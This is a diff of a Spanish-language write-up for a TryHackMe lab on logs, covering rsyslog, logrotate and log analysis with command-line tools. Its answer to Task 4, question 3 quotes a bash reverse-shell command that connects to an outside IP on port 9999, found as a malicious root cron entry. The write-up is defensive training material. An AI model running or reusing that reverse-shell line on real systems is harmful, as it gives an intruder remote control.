@@ -1,11 +1,14 @@
-**Dificultad** -> Fácil | **Fecha** -> 31-jul-26 | **Tipo** -> Free + Hands-onA
+# TryHackMe — Intro to Logs
+**Dificultad** -> Fácil | **Fecha** -> 31-jul-26 | **Tipo** -> Free + Hands-on
 **Sala** -> [Intro to logs](https://www.tryhackme.com/room/introtologs)
 ___
 ## Introducción
 La sala se enfoca en lo que es un log, las fuentes y los métodos de recolección de los mismos. También se aborda el logging desde cero en Linux con **rsyslog** y **logrotate** para analizar y detectar posible actividad maliciosa.
 ## Solución
-> [!NOTA]
+
+> [!NOTE]
 > El acceso a la máquina se puede llevar a cabo por medio de la VPN de TryHackMe, con el laboratorio dentro de la sala o con `xfreerdp` en Linux.
+
 ### Task 2 — Logs as evidence of historical activity
 Escenario descrito: un servidor está bajo constantes escaneos de adversarios. Un compañero desconocido nos dejó una nota en el escritorio para empezar la investigación desde cierto archivo.
 
@@ -20,7 +23,6 @@ ___
 
 *Pregunta 2: What is the full path to the suggested log file for initial investigation?*
 **Respuesta: `/var/log/gitlab/nginx/access.log`**
-___
 ### Task 3 — Types, formats and standards
 #### Log Types
 Hay muchos tipos de logs dentro del sistema que podemos revisar, los más comúnes son: **Application**, **Audit**, **Security**, **Server**, **System**, **Network**, **Database**, **Web server**.
@@ -29,16 +31,19 @@ Los formatos de los logs varían pero usualmente van a caer en 3 categorías:
 - **Estructurados:** JSON, CSV, XML, ELF
 - **Semiestructurados:** syslog, EVTX
 - **Desestructurados:** CLF, Combined
+
 ___
+
 *Pregunta 1: Based on the list of log types in this task, what log type is used by the log file specified in the note from Task 2?*
 **Respuesta: Web server log**
-NGINX es un servidor web, por lo tanto son peticiones HTTP lo que se está buscando.
+> NGINX es un servidor web, por lo tanto son peticiones HTTP lo que se está buscando.
 
 *Pregunta 2: Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?*
 **Respuesta: Combined**
-Los logs tienen IP, timestamp, método HTTP, URL, status, referrer y User-Agent, por lo tanto es NCSA Combined.
-___
+> Los logs tienen IP, timestamp, método HTTP, URL, status, referrer y User-Agent, por lo tanto es NCSA Combined.
+
 ### Task 4 — Collection, Management and Centralisation
+
 ```shell
 # 1. Verificar que rsyslog esté activo
 sudo systemctl status rsyslog
@@ -55,18 +60,23 @@ $FileCreateMode 0644
 sudo systemctl restart rsyslog
 ls /var/log/websrv-02/
 ```
-![[Pasted image 20260803161800.png]]
+
+![rsyslog](<rsyslog.png>)
+
 ```bash
 # Revisar la actividad de SSH en el archivo 
 cat /var/log/websrv-02/rsyslog_sshd.log
 ```
-![[Pasted image 20260807164039.png]]
+
+![tail_command](<tail.png>)
+
 ``` bash
 # Revisar la configuración del cron
 cat /etc/rsyslog.d/99-websrv-02-cron.conf
 ```
+
 ```bash
-# Lo que aparece dentro del archivo de configuración de cron
+# Dentro del archivo de configuración de cron
 
 # Log Forwarding with rsyslog
 $FileCreateMode 0644
@@ -79,30 +89,37 @@ $FileCreateMode 0644
 # Buscar los comandos ejecutados por root
 cat /var/log/websrv-02/rsyslog_cron.log | grep -w "CMD"
 ```
-![[Pasted image 20260803165717.png]]
+
+![cat_command](<cat.png>)
 
 ___
+
 *Pregunta 1: After configuring rsyslog for sshd, what username repeatedly appears in the sshd logs at /var/log/websrv-02/rsyslog_sshd.log, indicating failed login attempts or brute forcing?*
 **Respuesta: stansimon**
-Cuando se despliega la información (utilizando `cat`) se puede notar que hay un usuario que ha intentado ingresar pero falla al autenticar el usuario. Aparece `Connection closed by invalid user stansimon` o `Failed password for invalid user stansimon`.
+
+> Cuando se despliega la información (utilizando `cat`) se puede notar que hay un usuario que ha intentado ingresar pero falla al autenticarse; aparece como:
+> 
+> `Connection closed by invalid user stansimon` o `Failed password for invalid user stansimon`.
 
 *Pregunta 2: What is the IP address of SIEM-02 based on the rsyslog configuration file `/etc/rsyslog.d/99-websrv-02-cron.conf`, which is used to monitor cron messages?*
 **Respuesta: `10.10.10.101`**
-> **NOTA** > Se puede utilizar el comando `cat` para visualizar el archivo sin abrirlo.
+
+> **NOTA**: Se puede utilizar el comando `cat` para visualizar el archivo sin abrirlo.
+
 ``` shell
 $ cat /etc/rsyslog.d/99-websrv-02-cron.conf
 ```
-![[Pasted image 20260803163447.png]]
 
 *Pregunta 3: Based on the generated logs in `/var/log/websrv-02/rsyslog_cron.log`, what command is being executed by the root user?*
 **Respuesta: `/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"`**
-**Cuidado**: Al desplegar el comando, puede engañar ya que es muy largo. La parte relevante es el comando que se repite, no el más largo en primera instancia.
 
-![[Pasted image 20260803165717.png]]
-El que se repita mucho un comando es un indicio de que algo raro está pasando, no se debe ignorar.
-___
+> **ADVERTENCIA**: Al desplegar el comando, puede engañar ya que es muy largo. La parte relevante es el comando que se repite, no el más largo en primera instancia.
+> 
+> **INFO**: que un comando se repita es un indicativo de que algo raro está pasando, no se debe ignorar.
+
 ### Task 5 — Storage, Retention and Deletion
 #### Configurando...
+
 ```bash
 # Crear el archivo de configuración de SSH
 /etc/logrotate.d/98-websrv-02_sshd.conf
@@ -133,56 +150,63 @@ ___
 #Ejecutando el archivo manualmente
 sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf
 ```
-Cuando termina la ejecución, se crea el archivo de hashes para el **rsyslog** de SSH resaltado en amarillo:
-![[Pasted image 20260803202705.png]]
-![[Pasted image 20260803203032.png]]
+
+Cuando termina la ejecución, se crea el archivo de hashes para el **rsyslog** de SSH (se resaltó en amarillo)
+
+![hashes](<rsyslog_hashes.png>)
+
 ___
+
 *Pregunta 1: Based on the logrotate configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, how many versions of old compressed log file copies will be kept?*
 **Respuesta: 24**
-![[Pasted image 20260803203342.png]]
+
+![websrv](<websrv.png>)
 
 *Pregunta 2: Based on the logrotate configuration `/etc/logrotate.d/99-websrv-02_cron.conf`, what is the log rotation frequency?*
 **Respuesta: hourly**
-![[Pasted image 20260803203643.png]]
+
 ___
 ### Task 6 — Log analysis process, tools and techniques
 **Flujo del análisis:**
+
 ```http
 <!-- Observando los logs en crudo en el Log Viewer (dentro de la VM) -->
 http://MACHINE_IP:8111/log?log=%2Fvar%2Flog%2Fgitlab%2Fnginx%2Faccess.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_cron.log&log=%2Fvar%2Flog%2Fwebsrv-02%2Frsyslog_sshd.log&log=%2Fvar%2Flog%2Fgitlab%2Fgitlab-rails%2Fapi_json.log
 ```
-![[Pasted image 20260804154527.png]]
+
+![log_viewer](<log_viewer.png>)
+
 ```bash
 # Usar awk y sed para normalizar las entradas de los logs
 awk -F'[][]' '{print "[" $2 "]", "--- /var/log/gitlab/nginx/access.log ---", "\"" $0 "\""}' /var/log/gitlab/nginx/access.log | sed "s/ +0000//g" > /tmp/parsed_consolidated.log
 ```
- ![[Pasted image 20260804155323.png]]
    
 ```shell
 # Flitrando la IP sospechosa
 grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log
 ```
-![[Pasted image 20260804162109.png]]
+
 ```bash
 # Ordenando por el timestamp
 sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log
 ```
-![[Pasted image 20260804162320.png]]
+
 ```bash
 # Eliminando duplicados con uniq
 uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log
 ```
-![[Pasted image 20260804162756.png]]
+
 ```yaml
 # Observar el resultado en el Log Viewer
 http://MACHINE_IP:8111/log?path=%2Ftmp%2Funiq_sort_parsed_consolidated.log
 ```
-![[Pasted image 20260804163043.png]]
+
+![consolidated_](<log_viewer_consolidated.png>)
  
 ___
 *Pregunta 1: Upon accessing the log viewer URL for unparsed raw log files, what error does `/var/log/websrv-02/rsyslog_cron.log` show when selecting the different filters?*
 **Respuesta: No date field**
-![[Pasted image 20260804170427.png]]
+
 > **Cuidado**: Se debe desplegar el menú (1 / 4 logs), no agregar un filtro (`+Add filter`).
 
 *Pregunta 2: What is the process of standardising parsed data into a more easily readable and query-able format?*
@@ -204,4 +228,4 @@ ___
 - Los comandos que se repiten en **cron** son sospechosos por definición; no es normal que se creen estos comandos.
 - Los logs por si solos no dicen nada. Hasta que no se correlacionan, es cuando tienen importancia y revelan un ataque.
 ## References
-[[TryHackMe — Intro to Log Analysis]]
+[TryHackMe — Intro to Log Analysis](<TryHackMe — Intro to Log Analysis.md>)
